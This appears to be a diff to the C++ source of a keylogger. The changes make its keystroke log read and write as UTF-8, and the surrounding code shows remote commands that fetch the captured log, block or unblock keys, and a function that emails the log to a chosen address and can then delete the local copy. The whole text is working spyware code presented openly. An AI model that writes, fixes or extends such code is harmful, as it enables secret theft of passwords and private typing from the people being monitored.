@@ -21,24 +21,29 @@ Keylogger::Keylogger() {
 		return L"Not working for now";
 	});
 	CommandParser::addCommand(L"get", [this](std::wstring argStr) {
+		const std::locale utf8_locale
+			= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
+
 		logFile.close();
-		std::ifstream logData;
+		std::wifstream logData;
+		logData.imbue(utf8_locale);
 		logData.open(this->FILENAME, std::ios::in);
-		std::wstring data((std::istreambuf_iterator<char>(logData)),
-			std::istreambuf_iterator<char>());
+		std::wstring data((std::istreambuf_iterator<wchar_t>(logData)),
+			std::istreambuf_iterator<wchar_t>());
 		logData.close();
+		logData.imbue(utf8_locale);
 		logFile.open(this->FILENAME, std::ios::app);
 		return data;
 	});
 	CommandParser::addCommand(L"block", [this](std::wstring argStr) {
-		auto keys = StringUtilities::splitString(argStr, L" ");
+		auto keys = StringHelper::splitString(argStr, L" ");
 		for (auto key = keys.begin(); key != keys.end(); key++) {
 			KeyBlockService::getInstance()->addBlockedKey(*key);
 		}
 		return L"ok";
 	});
 	CommandParser::addCommand(L"unblock", [this](std::wstring argStr) {
-		auto keys = StringUtilities::splitString(argStr, L" ");
+		auto keys = StringHelper::splitString(argStr, L" ");
 		for (auto key = keys.begin(); key != keys.end(); key++) {
 			KeyBlockService::getInstance()->removeBlockedKey(*key);
 		}
@@ -140,8 +145,11 @@ bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	subject << "Keylogger report. " << "Compname";
 
 	// Create email body
+	const std::locale utf8_locale
+		= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
 	logFile.close();
 	std::wifstream logData;
+	logData.imbue(utf8_locale);
 	logData.open(this->FILENAME, std::ios::in);
 	std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
 		std::istreambuf_iterator<wchar_t>());
@@ -154,6 +162,7 @@ bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	}
 
 	auto openMode = deleteLocal ? std::ios::trunc : std::ios::app;
+	logFile.imbue(utf8_locale);
 	logFile.open(this->FILENAME, openMode);
 
 	this->lastActiveWindow = nullptr;
